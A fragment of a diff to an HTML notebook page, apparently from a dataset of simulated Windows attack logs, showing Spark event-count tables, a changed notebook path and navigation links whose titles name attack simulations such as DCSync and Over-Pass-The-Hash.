-|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |48   |
-|WORKSTATION5.theshire.local|Security                                |5158   |48   |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |3      |38   |
-|WORKSTATION6.theshire.local|Security                                |5156   |38   |
-|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |13     |37   |
-|MORDORDC.theshire.local    |Microsoft-Windows-Sysmon/Operational    |3      |36   |
-|MORDORDC.theshire.local    |Security                                |4690   |32   |
-|MORDORDC.theshire.local    |Security                                |4663   |32   |
-|WORKSTATION6.theshire.local|Security                                |4703   |32   |
-|MORDORDC.theshire.local    |Security                                |4656   |32   |
-|MORDORDC.theshire.local    |Microsoft-Windows-Sysmon/Operational    |10     |30   |
-+---------------------------+----------------------------------------+-------+-----+
-only showing top 20 rows
-</pre></div>
-</div>
-</div>
 </div>
 </div>
 </div>
@@ -1019,7 +915,7 @@ only showing top 20 rows
         },
         kernelOptions: {
             kernelName: "pyspark3",
-            path: "./notebooks/small/windows/06_credential_access"
+            path: "./notebooks/small/windows/08_lateral_movement"
         },
         predefinedOutput: true
     }
@@ -1034,8 +930,8 @@ only showing top 20 rows
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="SDWIN-200922042230.html" title="previous page">Empire Powerdump Extract Hashes</a>
-    <a class='right-next' id="next-link" href="SDWIN-200805020926.html" title="next page">Covenant DCSync</a>
+    <a class='left-prev' id="prev-link" href="SDWIN-200806022635.html" title="previous page">Covenant SharpSC Create</a>
+    <a class='right-next' id="next-link" href="SDWIN-190319131123.html" title="next page">Empire Over-Pass-The-Hash</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
